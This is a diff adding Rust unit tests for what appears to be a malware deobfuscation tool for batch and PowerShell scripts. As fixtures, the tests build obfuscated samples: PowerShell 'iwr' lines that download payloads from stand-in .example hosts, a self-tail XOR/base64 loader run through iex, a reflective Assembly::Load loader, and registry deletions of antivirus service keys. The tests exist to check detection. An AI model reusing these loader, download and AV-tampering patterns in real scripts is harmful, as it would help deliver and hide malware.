+            "set \"carrier='j''kVurlBase''64 = 1'+'mcaHR0cHM6Ly9leGFtcGxlLnRlc3QvcGF5bG9hZA==1m'+'c; jk'\"";
+        let text = format!("{noisy}\r\necho keep\r\n{noisy}\r\n{noisy}\r\n{noisy}\r\n");
+
+        let mut env = crate::Environment::new(&Config::default());
+        let cleaned = crate::coalesce_repeated_unicode_marker_set_lines(&text, &mut env);
+
+        assert_eq!(
+            cleaned.matches(noisy).count(),
+            1,
+            "only the first exact duplicate base64-concat scaffold should remain:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("rem omitted 3 repeated marker set scaffolding lines"),
+            "omission summary missing:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("echo keep"),
+            "non-marker line was not preserved:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn binary_noise_line_run_is_summarized_before_interpretation() {
+        let mut script =
+            b"powershell -c \"iwr https://binary-noise.example/payload.ps1\"\r\n".to_vec();
+        for _ in 0..4000 {
+            script.extend(std::iter::repeat(0x90).take(240));
+            script.extend_from_slice(b"\r\n");
+        }
+        let report = analyze(
+            &script,
+            &Config {
+                timeout_secs: 1,
+                ..Config::default()
+            },
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(t, Trait::TimeoutHit)),
+            "binary noise line run should not burn the timeout: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("omitted 4000 binary-looking lines"),
+            "binary noise run was not summarized:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn mixed_binary_text_line_run_is_summarized() {
+        let mut script = b"@echo off\r\n".to_vec();
+        for i in 0..64 {
+            script.extend_from_slice(format!("chunk{i:02} alpha beta ").as_bytes());
+            script.extend_from_slice(&[0xff, 0xfe, 0x81, 0x00, b'X', b'Y', b'Z']);
+            script.extend_from_slice(b"\r\n");
+        }
+
+        let report = analyze(
+            &script,
+            &Config {
+                timeout_secs: 1,
+                ..Config::default()
+            },
+        );
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("omitted 64 binary-looking lines"),
+            "mixed binary/text run was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains("chunk00 alpha beta"),
+            "mixed binary/text payload leaked into output"
+        );
+    }
+
+    #[test]
+    fn residual_binary_lines_are_suppressed_when_summary_exists() {
+        let text = "echo keep\r\nrem omitted 40 binary-looking lines (2000 bytes)\r\nabc�\u{0001}def\r\n���\r\n";
+        let mut env = crate::env::Environment::new(&Config::default());
+        let cleaned = crate::suppress_residual_binary_noise_lines(text, &mut env)
+            .expect("residual binary lines should be suppressed");
+
+        assert!(cleaned.contains("echo keep"));
+        assert!(cleaned.contains("residual binary-looking lines"));
+        assert!(!cleaned.contains("abc�"));
+    }
+
+    #[test]
+    fn repetitive_rem_noise_run_is_summarized_before_interpretation() {
+        let mut script = String::from("@echo off\r\n");
+        for _ in 0..10_000 {
+            script.push_str("REM IGUBLCNWIZOGZPSAXFFHTDERJUVYTIYXTFRLOSBECSKFFEXDVXGXCNBFCCRRGOCZAQMUYHMEDBEBTYLEWSDWCBVGEMIMAKXNPKEORDFOLBTAIALDQMUOLGXZVGPLYAETDQLITXNTMPLBHUXEAFVNQICJNFTLNTPLXAXSODKTZABVUVSAILLSEQDUNBUODBFTZAEHXFPX\r\n");
+        }
+        script.push_str("powershell -c \"iwr https://rem-noise.example/payload.ps1\"\r\n");
+
+        let report = analyze(
+            script.as_bytes(),
+            &Config {
+                timeout_secs: 1,
+                ..Config::default()
+            },
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(t, Trait::TimeoutHit)),
+            "repetitive REM noise should not burn the timeout: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("omitted 10000 repetitive REM noise lines"),
+            "repetitive REM noise was not summarized:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn cumulative_raw_summaries_preserve_rem_noise_after_colon_payload() {
+        let mut script = String::from("@echo off\r\n");
+        script.push_str(":: ");
+        script.push_str(&"A".repeat(4096));
+        script.push_str("\r\n");
+        for _ in 0..96 {
+            script.push_str("@REM mz568GkJzOGzPROSESHYCIoUta5uTJTOfIk923JzgYakdKSEtSTYqyQOkkM7LZZ041tgGO0LjhROHeRTrAaaZ4yR2GZRqLYq8kpl\r\n");
+        }
+        script.push_str("powershell -c \"iwr https://rem-noise.example/payload.ps1\"\r\n");
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("bytes from long :: payload line"),
+            "long :: payload summary was not preserved:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("omitted 96 repetitive REM noise lines"),
+            "later REM summary was dropped:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains("mz568GkJzOGzPROSESHYCIo"),
+            "raw REM carrier leaked:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn materialized_rem_noise_run_is_summarized_after_interpretation() {
+        let mut script = String::from("@echo off\r\n");
+        for idx in 0..96 {
+            script.push_str(&format!(
+                "set \"r{idx}=@REM mz568GkJzOGzPROSESHYCIoUta5uTJTOfIk923JzgYakdKSEtSTYqyQOkkM7LZZ041tgGO0LjhROHeRTrAaaZ4yR2GZRqLYq8kpl{idx:02}\"\r\n"
+            ));
+        }
+        for idx in 0..96 {
+            script.push_str(&format!("%r{idx}%\r\n"));
+        }
+        script.push_str("powershell -c \"iwr https://rem-noise.example/payload.ps1\"\r\n");
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("omitted 96 repetitive REM noise lines"),
+            "materialized REM run was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.lines().any(|line| line
+                .trim_start()
+                .starts_with("@REM mz568GkJzOGzPROSESHYCIo")),
+            "raw materialized REM carrier leaked:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("https://rem-noise.example/payload.ps1"),
+            "following IOC was not preserved:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn mixed_case_rem_carrier_run_is_summarized() {
+        let mut script = String::from("@echo off\r\n");
+        for idx in 0..96 {
+            let prefix = match idx % 4 {
+                0 => "REM",
+                1 => "Rem",
+                2 => "reM",
+                _ => "ReM",
+            };
+            script.push_str(&format!(
+                "set \"r{idx}=@{prefix} TkfVKbMw0T.0Jva-.XU.1K/iQP+WIhZ9kvcW8EKgeMFyYsZ1las97yRJo-F/h6oT+FPeTDF+N3joFNJn6I0x4fB1dTy,oo14Td{idx:02}\"\r\n"
+            ));
+        }
+        for idx in 0..96 {
+            script.push_str(&format!("%r{idx}%\r\n"));
+        }
+        script.push_str("echo after\r\n");
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("omitted 96 repetitive REM noise lines"),
+            "mixed-case REM carrier run was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.lines().any(|line| {
+                let trimmed = line.trim_start();
+                trimmed.starts_with("@REM TkfVKbMw0T.0Jva")
+                    || trimmed.starts_with("@Rem TkfVKbMw0T.0Jva")
+                    || trimmed.starts_with("@reM TkfVKbMw0T.0Jva")
+                    || trimmed.starts_with("@ReM TkfVKbMw0T.0Jva")
+            }),
+            "raw materialized REM carrier leaked:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.contains("echo after"),
+            "following command was not preserved:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn adjacent_long_rem_comment_payloads_are_aggregated() {
+        let mut script = String::from("@echo off\r\n");
+        for idx in 0..96 {
+            script.push_str(&format!("REM {}{}\r\n", "A".repeat(1400), idx));
+        }
+        script.push_str("echo after\r\n");
+
+        let mut env = Environment::new(&Config::default());
+        let cleaned = crate::summarize_long_rem_comment_lines(&script, &mut env);
+
+        assert!(
+            cleaned.contains("rem omitted 96 long REM comment lines"),
+            "adjacent long REM comments were not aggregated:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("bytes from long REM comment line"),
+            "per-line long REM summaries leaked:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains(&"A".repeat(512)),
+            "raw REM payload leaked:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("echo after"),
+            "following command was not preserved:\n{}",
+            cleaned
+        );
+        assert_eq!(
+            env.traits
+                .iter()
+                .filter(|t| matches!(t, Trait::LineTruncated { .. }))
+                .count(),
+            1,
+            "expected one LineTruncated for the whole REM run: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn sparse_high_entropy_rem_comment_payloads_are_summarized() {
+        let carrier = "TkfVKbMw0T.0Jva-.XU.1K/iQP+WIhZ9kvcW8EKgeMFyYsZ1las97yRJo-F/h6oT+FPeTDF+N3joFNJn6I0x4fB1dTy,oo14Td";
+        let text = format!(
+            "@echo off\r\nREM {}{}\r\necho between\r\nrEM {}{}\r\necho after\r\n",
+            carrier.repeat(4),
+            "A1",
+            carrier.repeat(5),
+            "B2"
+        );
+
+        let mut env = Environment::new(&Config::default());
+        let cleaned = crate::summarize_long_rem_comment_lines(&text, &mut env);
+
+        assert!(
+            cleaned.contains("rem omitted") && cleaned.contains("bytes from long REM comment line"),
+            "sparse high-entropy REM payloads were not summarized:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains(carrier),
+            "raw high-entropy REM carrier leaked:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("echo between") && cleaned.contains("echo after"),
+            "neighboring commands were not preserved:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn adjacent_rendered_long_rem_summaries_are_coalesced() {
+        let text = "\
+@echo off\r\n\
+rem omitted 1200 bytes from long REM comment line\r\n\
+rem omitted 1800 bytes from long REM comment line\r\n\
+rem omitted 2400 bytes from long REM comment line\r\n\
+echo after\r\n";
+
+        let mut env = Environment::new(&Config::default());
+        let cleaned = crate::coalesce_long_rem_comment_summary_lines(text, &mut env)
+            .expect("rendered long REM summary run should coalesce");
+
+        assert!(
+            cleaned.contains("rem omitted 3 long REM comment lines (5400 payload bytes)"),
+            "rendered summaries were not coalesced:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("1200 bytes from long REM comment line"),
+            "individual rendered summary leaked:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("echo after"),
+            "following command was not preserved:\n{}",
+            cleaned
+        );
+        assert_eq!(
+            env.traits
+                .iter()
+                .filter(|t| matches!(t, Trait::LineTruncated { .. }))
+                .count(),
+            1,
+            "expected one LineTruncated for the coalesced rendered run: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn adjacent_mixed_rendered_long_rem_summary_groups_are_coalesced() {
+        let text = "\
+@echo off\r\n\
+rem omitted 1200 bytes from long REM comment line\r\n\
+rem omitted 6 long REM comment lines (14980 payload bytes)\r\n\
+rem omitted 2 long REM comment lines (6756 payload bytes)\r\n\
+echo after\r\n";
+
+        let mut env = Environment::new(&Config::default());
+        let cleaned = crate::coalesce_long_rem_comment_summary_lines(text, &mut env)
+            .expect("mixed rendered long REM summary run should coalesce");
+
+        assert!(
+            cleaned.contains("rem omitted 9 long REM comment lines (22936 payload bytes)"),
+            "mixed rendered summaries were not coalesced:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains("14980 payload bytes"),
+            "individual grouped summary leaked:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains("echo after"),
+            "following command was not preserved:\n{}",
+            cleaned
+        );
+    }
+
+    #[test]
+    fn repeated_windows_profile_check_blocks_are_summarized() {
+        let mut script = String::from("@echo off\r\n");
+        for idx in 0..200 {
+            script.push_str(&format!(":_WP_{idx:04}_DefenderCheck\r\n"));
+            script.push_str("for /f \"tokens=3*\" %%x in ('sc query WinDefend') do (\r\n)\r\n");
+            script.push_str(&format!(
+                "echo [INFO] Defender service is active {}\r\nexit /b 0\r\n",
+                "diagnostic padding ".repeat(8)
+            ));
+        }
+        script.push_str(":after\r\necho after\r\n");
+
+        let mut env = Environment::new(&Config::default());
+        let cleaned = crate::summarize_repeated_windows_profile_check_blocks(&script, &mut env)
+            .expect("dense Windows profile check blocks should summarize");
+
+        assert!(
+            cleaned.contains("rem omitted 200 repeated Windows profile check blocks"),
+            "Windows profile check blocks were not summarized:\n{}",
+            cleaned
+        );
+        assert!(
+            !cleaned.contains(":_WP_0040_DefenderCheck"),
+            "middle diagnostic block leaked:\n{}",
+            cleaned
+        );
+        assert!(
+            cleaned.contains(":after\r\necho after"),
+            "following non-WP label was not preserved:\n{}",
+            cleaned
+        );
+        assert!(
+            env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::LineTruncated { .. })),
+            "LineTruncated trait was not emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn hash_prefixed_long_alpha_echo_noise_is_summarized_before_scans() {
+        let payload = "rodhfjkghduiafheytiorutoeiutioeuadrfhiuygurwyetoiqeyoqutqyeoreiqutiorueuirr"
+            .repeat(4096);
+        let script = format!("#echo {payload}\r\npowershell -c \"Write-Host done\"\r\n");
+        let report = analyze(
+            script.as_bytes(),
+            &Config {
+                timeout_secs: 1,
+                ..Config::default()
+            },
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(t, Trait::TimeoutHit)),
+            "hash-prefixed alpha echo noise should not burn the timeout: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted 307200 bytes from long alpha echo line"),
+            "hash-prefixed alpha echo noise was not summarized:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn tail_spaced_powershell_payload_is_summarized_before_scans() {
+        use base64::Engine;
+
+        let loader = format!(
+            "{}{}{}{}",
+            "FUNCTION dECOMPRESSbUFFER { New-Object System.IO.Compression.DeflateStream }\r\n",
+            "FUNCTION lOADaSSEMBLY { [System.Reflection.Assembly]::Load($args) }\r\n",
+            "A".repeat(80_000),
+            "\r\n"
+        );
+        let spaced: Vec<u8> = loader.bytes().flat_map(|b| [b, b' ']).collect();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(spaced);
+        let script = format!("powershell -c \"Write-Host loader\"\r\n{b64}\r\n");
+
+        let report = analyze(
+            script.as_bytes(),
+            &Config {
+                timeout_secs: 1,
+                ..Config::default()
+            },
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(t, Trait::TimeoutHit)),
+            "spaced PowerShell tail should not burn the timeout: {:?}",
+            report.traits
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::ChildScriptsCapped)),
+            "spaced PowerShell tail should not exhaust child-script budget: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted self-tail spaced PowerShell payload"),
+            "spaced PowerShell tail was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&b64),
+            "spaced PowerShell tail remained in deobfuscated output"
+        );
+    }
+
+    #[test]
+    fn self_tail_base64_xor_utf16_powershell_stage_is_extracted() {
+        use base64::Engine;
+        use std::io::Write as _;
+
+        let url = "https://self-tail-xor.example/stage.ps1";
+        let mut pe = vec![0u8; 0x200];
+        pe[0..2].copy_from_slice(b"MZ");
+        pe[0x3c..0x40].copy_from_slice(&0x80u32.to_le_bytes());
+        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
+        let mut encoder =
+            flate2::write::DeflateEncoder::new(Vec::new(), flate2::Compression::default());
+        encoder.write_all(&pe).expect("writes PE fixture");
+        let assembly_blob = base64::engine::general_purpose::STANDARD.encode(
+            encoder
+                .finish()
+                .expect("finishes compressed PE fixture")
+                .into_iter()
+                .map(|byte| byte ^ 74)
+                .collect::<Vec<_>>(),
+        );
+        let stage = format!(
+            "function DecompressBuffer {{ New-Object System.IO.Compression.DeflateStream }}\r\n\
+             function Xor {{ param([byte[]]$a, [int]$b) $a }}\r\n\
+             function DecodeBase64 {{ param([string]$a) [Convert]::FromBase64String($a) }}\r\n\
+             function LoadAssembly {{ [System.Reflection.Assembly]::Load($args) }}\r\n\
+             function Load {{ $o=DecodeBase64 -a $a;$o=Xor -a $o -b $b;$o=DecompressBuffer -data $o;$assembly=LoadAssembly -a $o }}\r\n\
+             Load -a \"{assembly_blob}\" -b 74\r\n\
+             Invoke-WebRequest -Uri {url}\r\n{}",
+            "A".repeat(1_600_000)
+        );
+        let encrypted: Vec<u8> = stage
+            .encode_utf16()
+            .flat_map(u16::to_le_bytes)
+            .map(|byte| byte ^ 0x20)
+            .collect();
+        let b64 = base64::engine::general_purpose::STANDARD.encode(encrypted);
+        let script = format!(
+            "@echo off\r\npowershell -NoP -C \"$k=0x20;$p='script.bat';$_1=Get-Content -Path $p;$_3=$_1 -split '\\n';$_2=$_3[-1];$_2=[Convert]::FromBase64String($_2);$_4=0..($_2.Length-1)|%{{$_2[$_]-bxor 0x20}};$_4=[Text.Encoding]::Unicode.GetString($_4);iex $_4\"\r\nexit\r\n{b64}\r\n"
+        );
+
+        let report = analyze(
+            script.as_bytes(),
+            &Config {
+                timeout_secs: 3,
+                ..Config::default()
+            },
+        );
+
+        assert!(
+            !report.traits.iter().any(|t| matches!(t, Trait::TimeoutHit)),
+            "large self-tail PowerShell stage should retain partial artifacts without timing out: {:?}",
+            report.traits
+        );
+
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains(url)),
+            "self-tail XOR stage was not normalized: {:?}",
+            report.extracted_ps1_normalized
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. } | Trait::DownloadInDeobText { src, .. }
+                        if src == url
+                )
+            }),
+            "self-tail XOR stage URL was not extracted: {:?}",
+            report.traits
+        );
+        assert!(
+            report.recovered_pe.iter().any(|(label, bytes)| {
+                label.starts_with("ps1-deflate-xor-base64-assembly") && bytes.starts_with(b"MZ")
+            }),
+            "self-tail XOR stage did not recover its nested assembly: {:?}",
+            report.recovered_pe
+        );
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted self-tail spaced PowerShell payload"),
+            "raw self-tail carrier was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.deobfuscated.contains(&b64),
+            "raw self-tail carrier leaked into deobfuscated output"
+        );
+    }
+
+    #[test]
+    fn deflate_xor_base64_assembly_loader_recovers_valid_pe() {
+        use base64::Engine as _;
+        use std::io::Write as _;
+
+        let mut pe = vec![0u8; 0x200];
+        pe[0..2].copy_from_slice(b"MZ");
+        pe[0x3c..0x40].copy_from_slice(&0x80u32.to_le_bytes());
+        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
+
+        let mut encoder =
+            flate2::write::DeflateEncoder::new(Vec::new(), flate2::Compression::default());
+        encoder.write_all(&pe).expect("writes PE fixture");
+        let encrypted: Vec<u8> = encoder
+            .finish()
+            .expect("finishes compressed PE fixture")
+            .into_iter()
+            .map(|byte| byte ^ 74)
+            .collect();
+        let blob = base64::engine::general_purpose::STANDARD.encode(encrypted);
+        let script = format!(
+            r#"function DecompressBuffer {{
+    param([byte[]]$data)
+    New-Object System.IO.Compression.DeflateStream
+}}
+function Xor {{ param([byte[]]$a, [int]$b) $a }}
+function DecodeBase64 {{ param([string]$a) [Convert]::FromBase64String($a) }}
+function LoadAssembly {{ param([byte[]]$a) [System.Reflection.Assembly]::Load($a) }}
+function Load {{
+    param([string]$a, [int]$b)
+    $o=DecodeBase64 -a $a
+    $o=Xor -a $o -b $b
+    $o=DecompressBuffer -data $o
+    $assembly=LoadAssembly -a $o
+}}
+Load -a "{blob}" -b 74"#
+        );
+
+        let recovered =
+            crate::ps1_scan::recover_deflate_xor_base64_assembly_payloads(&script, None);
+        assert!(
+            recovered.iter().any(|bytes| bytes.starts_with(b"MZ")),
+            "function-wrapped deflate/XOR/Base64 assembly was not recovered: {recovered:?}"
+        );
+    }
+
+    fn assert_live_admin_cap(traits: &[Trait], total: u64) {
+        let kept_admin = traits
+            .iter()
+            .filter(|t| matches!(t, Trait::AdminCommand { .. }))
+            .count();
+        assert!(
+            kept_admin <= 100,
+            "admin traits were not capped live: {kept_admin}"
+        );
+        assert!(
+            traits.iter().any(|t| match t {
+                Trait::TraitsCapped {
+                    capped_kind,
+                    total: capped_total,
+                    ..
+                } if capped_kind == "AdminCommand" && *capped_total == total => true,
+                Trait::AdminCommandSummary {
+                    category,
+                    total: summary_total,
+                    kept,
+                } if category == "dense-admin-cleanup"
+                    && *summary_total == total
+                    && *kept <= 16 =>
+                {
+                    true
+                }
+                _ => false,
+            }),
+            "missing live AdminCommand cap/summary total: {:?}",
+            traits
+        );
+    }
 
     #[test]
     fn excess_arithmetic_events_get_deduped() {
@@ -20660,6 +42460,177 @@ mod trait_dedup_tests {
     }
 
     #[test]
+    fn duplicate_defender_evasion_traits_are_semantically_deduped() {
+        let mut traits = vec![
+            Trait::DefenderEvasion {
+                action: "exclusion-path".to_string(),
+                target: r"C:\Users\puncher\AppData\Roaming".to_string(),
+            },
+            Trait::DefenderEvasion {
+                action: "exclusion-path".to_string(),
+                target: r"C:/Users/puncher/AppData/Roaming".to_string(),
+            },
+            Trait::DefenderEvasion {
+                action: "exclusion-process".to_string(),
+                target: r"C:\Users\puncher\AppData\Roaming".to_string(),
+            },
+        ];
+
+        super::dedup_traits(&mut traits, 100);
+
+        let evasion_count = traits
+            .iter()
+            .filter(|t| matches!(t, Trait::DefenderEvasion { .. }))
+            .count();
+        assert_eq!(
+            evasion_count, 2,
+            "duplicate DefenderEvasion traits were not deduped: {:?}",
+            traits
+        );
+    }
+
+    #[test]
+    fn repeated_line_truncation_traits_are_collapsed_before_capping() {
+        let mut traits = (0..150u64)
+            .map(|i| Trait::LineTruncated {
+                original_len: 512 + i,
+            })
+            .collect::<Vec<_>>();
+
+        super::dedup_traits(&mut traits, 100);
+
+        let line_truncated_count = traits
+            .iter()
+            .filter(|t| matches!(t, Trait::LineTruncated { .. }))
+            .count();
+        assert_eq!(
+            line_truncated_count, 1,
+            "LineTruncated traits were not collapsed: {:?}",
+            traits
+        );
+        assert!(
+            !traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::TraitsCapped { capped_kind, .. } if capped_kind == "LineTruncated"
+                )
+            }),
+            "LineTruncated should not emit generic trait cap: {:?}",
+            traits
+        );
+    }
+
+    #[test]
+    fn dense_admin_cleanup_traits_are_summarized_before_capping() {
+        let mut traits = Vec::new();
+        for i in 0..150u32 {
+            let (name, cmd) = match i % 3 {
+                0 => ("taskkill", format!("taskkill /f /im noisy{i}.exe")),
+                1 => (
+                    "reg",
+                    format!("reg delete HKLM\\Software\\Vendor\\Noisy{i} /f"),
+                ),
+                _ => (
+                    "rmdir",
+                    format!("rmdir /s /q C:\\Users\\puncher\\AppData\\Local\\Noisy{i}"),
+                ),
+            };
+            traits.push(Trait::AdminCommand {
+                name: name.to_string(),
+                cmd,
+            });
+        }
+        traits.push(Trait::TraitsCapped {
+            capped_kind: "AdminCommand".to_string(),
+            total: 8636,
+            kept: 100,
+        });
+
+        super::dedup_traits(&mut traits, 100);
+
+        assert!(
+            traits.iter().any(|t| matches!(
+                t,
+                Trait::AdminCommandSummary {
+                    category,
+                    total,
+                    kept
+                } if category == "dense-admin-cleanup" && *total == 8636 && *kept <= 16
+            )),
+            "missing dense admin cleanup summary: {:?}",
+            traits
+        );
+        assert!(
+            !traits.iter().any(|t| matches!(
+                t,
+                Trait::TraitsCapped { capped_kind, .. } if capped_kind == "AdminCommand"
+            )),
+            "dense admin cleanup should not emit generic AdminCommand cap: {:?}",
+            traits
+        );
+        let admin_count = traits
+            .iter()
+            .filter(|t| matches!(t, Trait::AdminCommand { .. }))
+            .count();
+        assert!(
+            admin_count <= 16,
+            "too many admin representatives kept: {admin_count}"
+        );
+    }
+
+    #[test]
+    fn medium_registry_cleanup_sweep_is_summarized_in_traits_and_output() {
+        let mut script = String::from("@echo off\r\n");
+        for idx in 0..62 {
+            script.push_str(&format!(
+                "Reg Delete \"HKLM\\SYSTEM\\CurrentControlSet\\services\\AV{idx}\" /f\r\n"
+            ));
+        }
+        for idx in 0..62 {
+            script.push_str(&format!(
+                "Reg Add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Attachments\" /v \"Noisy{idx}\" /t REG_DWORD /d \"1\" /f\r\n"
+            ));
+        }
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted dense admin cleanup command lines")
+                || report
+                    .deobfuscated
+                    .contains("repetitive admin cleanup commands"),
+            "medium cleanup sweep output was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::AdminCommandSummary {
+                        category,
+                        total: 124,
+                        kept,
+                    } if category == "dense-admin-cleanup" && *kept <= 16
+                )
+            }),
+            "medium cleanup sweep traits were not summarized: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::TraitsCapped { capped_kind, .. } if capped_kind == "AdminCommand"
+                )
+            }),
+            "medium cleanup sweep should not emit generic cap: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn capped_trait_summaries_are_emitted_in_stable_kind_order() {
         let mut traits = Vec::new();
         for i in 0..3 {
@@ -20690,6 +42661,262 @@ mod trait_dedup_tests {
     }
 
     #[test]
+    fn numeric_label_dispatch_noise_is_summarized_before_capping() {
+        let mut script = String::new();
+        for i in 0..150u32 {
+            script.push_str(&format!(
+                ":{}\r\nset /a anS={}*(0x{:x}^{:06o})\r\ngoto {}\r\n",
+                100_000 + i,
+                i + 2,
+                i + 0x120,
+                i + 17,
+                500_000 + i
+            ));
+        }
+
+        let report = analyze(
+            script.as_bytes(),
+            &Config {
+                max_traits_per_kind: 100,
+                ..Config::default()
+            },
+        );
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ControlFlowObfuscation {
+                        pattern,
+                        arithmetic_count,
+                        goto_count,
+                    } if pattern == "numeric-label-arithmetic-dispatch"
+                        && *arithmetic_count == 150
+                        && *goto_count == 150
+                )
+            }),
+            "missing numeric dispatch summary: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::TraitsCapped { capped_kind, .. }
+                    if capped_kind == "Arithmetic" || capped_kind == "GotoUnresolved"
+            )),
+            "numeric dispatch noise should not emit generic caps: {:?}",
+            report.traits
+        );
+        let arithmetic_count = report
+            .traits
+            .iter()
+            .filter(|t| matches!(t, Trait::Arithmetic { .. }))
+            .count();
+        let goto_count = report
+            .traits
+            .iter()
+            .filter(|t| matches!(t, Trait::GotoUnresolved { .. }))
+            .count();
+        assert!(
+            arithmetic_count <= 8 && goto_count <= 8,
+            "numeric dispatch representatives were not pruned: arithmetic={arithmetic_count}, goto={goto_count}"
+        );
+    }
+
+    #[test]
+    fn imbalanced_numeric_label_dispatch_traits_are_summarized() {
+        let mut traits = Vec::new();
+        for i in 0..21usize {
+            traits.push(Trait::Arithmetic {
+                expr: format!("ans=0x{:x}*~-{}", i + 3, 10_000 + i),
+                value: i as i32,
+            });
+        }
+        for i in 0..93usize {
+            traits.push(Trait::GotoUnresolved {
+                from_line: 300 + i,
+                to_label: format!("{}", 400_000 + (i % 21)),
+            });
+        }
+
+        super::dedup_traits(&mut traits, 100);
+
+        assert!(
+            traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ControlFlowObfuscation {
+                        pattern,
+                        arithmetic_count,
+                        goto_count,
+                    } if pattern == "numeric-label-arithmetic-dispatch"
+                        && *arithmetic_count == 21
+                        && *goto_count == 93
+                )
+            }),
+            "missing imbalanced numeric dispatch summary: {:?}",
+            traits
+        );
+        let arithmetic_count = traits
+            .iter()
+            .filter(|t| matches!(t, Trait::Arithmetic { .. }))
+            .count();
+        let goto_count = traits
+            .iter()
+            .filter(|t| matches!(t, Trait::GotoUnresolved { .. }))
+            .count();
+        assert!(
+            arithmetic_count <= 8 && goto_count <= 8,
+            "imbalanced numeric dispatch representatives were not pruned: arithmetic={arithmetic_count}, goto={goto_count}"
+        );
+    }
+
+    #[test]
+    fn numeric_label_dispatch_noise_is_summarized_in_deobfuscated_output() {
+        let mut script = String::from("@echo off\r\n");
+        for i in 0..40u32 {
+            script.push_str(&format!(
+                ":{}\r\nset /a anS={}*(0x{:x}^{:06o})\r\ngoto {}\r\nset \"v{}=x{}\"\r\n",
+                100_000 + i,
+                i + 2,
+                i + 0x120,
+                i + 17,
+                500_000 + i,
+                i,
+                i
+            ));
+        }
+        script.push_str("powershell -c \"Write-Output kept\"\r\n");
+
+        let mut env = Environment::new(&Config::default());
+        let directly_cleaned =
+            super::summarize_numeric_label_dispatch_scaffolding(&script, &mut env);
+        assert!(
+            directly_cleaned.contains("rem omitted numeric-label arithmetic dispatch scaffold"),
+            "direct numeric dispatch summarizer did not fire:\n{}",
+            directly_cleaned
+        );
+
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report
+                .deobfuscated
+                .contains("rem omitted numeric-label arithmetic dispatch scaffold"),
+            "numeric dispatch scaffold was not summarized:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.contains("powershell -c"),
+            "real command after scaffold should remain:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.matches("\r\n:100").count() <= 1,
